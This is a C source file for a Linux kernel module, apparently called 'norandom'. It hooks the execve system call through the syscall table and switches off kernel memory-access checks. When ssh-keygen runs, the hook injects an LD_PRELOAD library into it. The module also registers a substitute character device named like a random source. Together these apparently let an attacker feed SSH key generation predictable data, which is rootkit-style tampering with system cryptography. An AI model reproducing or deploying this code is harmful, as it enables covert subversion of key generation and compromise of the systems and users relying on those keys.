#include <linux/unistd.h>
#include "norandom.h"
#include "syscall_hook.h"
#include "execve_utils.h"

#define PROC_WATCH_NAME ("ssh-keygen")
#define PATH_WATCH_NAME ("/usr/bin/ssh-keygen")
#define LD_PRELOAD_ENV_VAR ("LD_PRELOAD=/usr/lib/preload/preload_so.so") //this MUST match the path the .so is moved to in the Makefile
#define MAX_PROC_NAME_LEN (16)
#define MAX_PROC_PATH_LEN (32)


int g_major;		/* g_major number assigned to our device driver */
asmlinkage int (*original_execve)(const char *, char * const*, char * const*);
unsigned long *sys_call_table;

const struct file_operations random_fops = {
	.read  = device_read,
	.write = dummy_write,
	.poll  = dummy_poll,
	.unlocked_ioctl = dummy_ioctl,
	.llseek = noop_llseek,
	.open = device_open,
	.release = device_release
};

asmlinkage int disrupted_execve(const char *filename, char *const argv[], char *const envp[], char *k_filename){
	int retval = 0;
	mm_segment_t old_fs;

	printk(KERN_INFO "PID %d (%s) called execve to execute %s. Adding LD_PRELOAD\n", current->pid, current->comm, k_filename);

	//by setting the fs register to KERNEL_DS, we disable the kernel memory access checks and make 
	// the execve syscall accept the fact that one of the pointers in envp is a pointer to kernel space
	old_fs = get_fs();
	set_fs(KERNEL_DS);
	
	insert_envp_value(LD_PRELOAD_ENV_VAR, envp);
	retval = original_execve(filename, argv, envp);
	
	set_fs(old_fs);
	
	return retval;
}

asmlinkage int hooked_execve(const char *filename, char *const argv[], char *const envp[]){
	char k_filename[MAX_PROC_PATH_LEN] = {0};

	(void)strncpy_from_user(k_filename, filename, MAX_PROC_PATH_LEN-1);

	if(0 == strncmp(k_filename, PATH_WATCH_NAME, MAX_PROC_PATH_LEN-1)){
		return disrupted_execve(filename, argv, envp, k_filename);
	}
	return original_execve(filename, argv, envp);;
}

int init_module(void)
{
	sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
	printk(KERN_INFO "System call table located at: %lx\n", (long unsigned int)sys_call_table);

	original_execve = (void*)sys_call_table[__NR_execve];
	printk(KERN_INFO "Hooking execve at offset %d, address %lx\n", __NR_execve, (long unsigned int)original_execve);
	hooking_syscall(sys_call_table, hooked_execve, __NR_execve);
    
	g_major = register_chrdev(0, DEVICE_NAME, &random_fops);
	if (g_major < 0) {
	  printk(KERN_ALERT "Registering char device failed with %d\n", g_major);
	  return g_major;
	}
	printk(KERN_INFO "norandom major: %d\n", g_major);
	
	return SUCCESS;
}

void cleanup_module(void)
{
	printk(KERN_INFO "Unhooking execve at offset %d, address %lx\n", __NR_execve, (long unsigned int)original_execve);
	unhooking_syscall(sys_call_table, original_execve, __NR_execve);

	printk(KERN_INFO "norandom device destroyed\n");
	unregister_chrdev(g_major, DEVICE_NAME);
}
MODULE_LICENSE("GPL");
